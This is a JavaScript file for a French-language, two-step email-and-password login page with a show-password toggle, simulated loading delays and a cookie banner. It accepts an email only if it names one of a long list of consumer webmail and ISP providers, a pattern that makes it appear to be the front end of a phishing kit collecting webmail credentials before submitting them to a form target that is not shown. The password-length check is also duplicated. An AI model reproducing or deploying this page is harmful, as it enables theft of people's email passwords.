function disallowSpace(element) {
    if (element.value[element.value.length - 1] === ' ') {
        element.value = element.value.slice(0, -1);
    }
}
document.getElementById('password').addEventListener('input', () => {
    const password = document.getElementById('password');
    const showPassword = document.getElementById('show-password');
    const loginContainer = document.getElementById('login-container');
    disallowSpace(password);
    if (password.value.length) {
        showPassword.classList.remove('hidden');
        if (loginContainer.classList.contains('error')) {
            loginContainer.classList.remove('error');
        }
    } 
    else {
        showPassword.classList.add('hidden');
    }
});
document.getElementById('show-password').addEventListener('click', () => {
    const password = document.getElementById('password');
    const showPassword = document.getElementById('show-password');
    if (password.type == 'password') {
        password.type = 'text';
        showPassword.innerHTML = 'Masquer';
    }
    else {
        password.type = 'password';
        showPassword.innerHTML = 'Afficher';
    }
});
document.getElementById('next-button').addEventListener('click', () => {
    const login = document.getElementById('login');
    const loginContainer = document.getElementById('login-container');
    const password = document.getElementById('password');
    const requiredError = document.getElementById('required-error');
    const nextButton = document.getElementById('next-button');
    const loginButton = document.getElementById('login-button');
    const forgotPassword = document.getElementById('forgot-password');
    const loader = document.getElementById('loader');
    const emailDisplay = document.getElementById('email-display');
    const userEmail = document.getElementById('user-email');
    if (!login.value.length) {
        if (!loginContainer.classList.contains('error')) {
            loginContainer.classList.add('error');
        }
        if (!requiredError.classList.contains('show')) {
            nextButton.style = 'z-index: -2';
            requiredError.classList.add('show');
            login.focus();
        }
    }
    else {
        const regex = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        const email = login.value.toLowerCase();
        if (regex.test(String(email))) {
            const domains = ['gmail', 'yahoo', 'hotmail', 'outlook', 'icloud', 'live', 'free', 'orange', 'sfr', 'neuf', 'laposte', 'gmx', 'skynet', 'proximus', 'belgacom', 'msn', 'windowslive', 'voo', 'telenet', 'scarlet', 'sosh', 'videotron', 'caramail', 'mail', 'me', 'canada', 'bell', 'club-internet', 'alice-adsl', 'shaw', 'cogeco'];
            let valid = false;
            domains.forEach(domain => {
                if (email.includes(domain)) {
                    valid = true;
                }
            });
            if (valid) {
                loader.classList.remove('hidden');
                setTimeout(() => {
                    password.classList.remove('hidden');
                    loginButton.classList.remove('hidden');
                    forgotPassword.classList.remove('hidden');
                    emailDisplay.classList.remove('hidden');
                    userEmail.innerHTML = email;
                    login.classList.add('hidden');
                    nextButton.classList.add('hidden');
                    loader.classList.add('hidden');
                    document.getElementById('error-message').innerHTML = 'Entrez votre mot de passe';
                }, 500);
            }
            else {
                loginContainer.classList.add('error');
            }
        }
        else {
            loginContainer.classList.add('error');
        }
    }
});
document.getElementById('login').addEventListener('blur', () => {
    const requiredError = document.getElementById('required-error');
    const nextButton = document.getElementById('next-button');
    if (requiredError.classList.contains('show')) {
        requiredError.classList.remove('show');
        nextButton.style = '';
    }
});
document.getElementById('login').addEventListener('input', () => {
    const login = document.getElementById('login');
    const loginContainer = document.getElementById('login-container');
    disallowSpace(login);
    if (login.value.length) {
        if (loginContainer.classList.contains('error')) {
            loginContainer.classList.remove('error');
        }
    }
});
document.getElementById('modify-email').addEventListener('click', () => {
    const login = document.getElementById('login');
    const password = document.getElementById('password');
    const nextButton = document.getElementById('next-button');
    const loginButton = document.getElementById('login-button');
    const forgotPassword = document.getElementById('forgot-password');
    const emailDisplay = document.getElementById('email-display');
    const showPassword = document.getElementById('show-password');
    password.classList.add('hidden');
    loginButton.classList.add('hidden');
    forgotPassword.classList.add('hidden');
    emailDisplay.classList.add('hidden');
    login.classList.remove('hidden');
    nextButton.classList.remove('hidden');
    showPassword.innerHTML = 'Afficher';
    login.value = '';
    document.getElementById('error-message').innerHTML = 'Obligatoire';
    showPassword.classList.add('hidden');
});
document.getElementById('login-button').addEventListener('click', () => {
    const password = document.getElementById('password');
    const loginContainer = document.getElementById('login-container');
    const showPassword = document.getElementById('show-password');
    const loader = document.getElementById('loader');
    if (password.value.length < 5) {
        loginContainer.classList.add('error');
        showPassword.classList.add('hidden');
        password.focus();
    }
    else {
       if (password.value.length < 5) {
        loginContainer.classList.add('error');
        showPassword.classList.add('hidden');
        password.focus();
        }
        else {
            loader.classList.remove('hidden');
            setTimeout(() => {
                document.getElementById('login-form').submit();
            }, 800);
        }
    }
});
document.getElementById('consent-button').addEventListener('click', () => {
    document.getElementById('cookies-container').classList.add('hidden');
});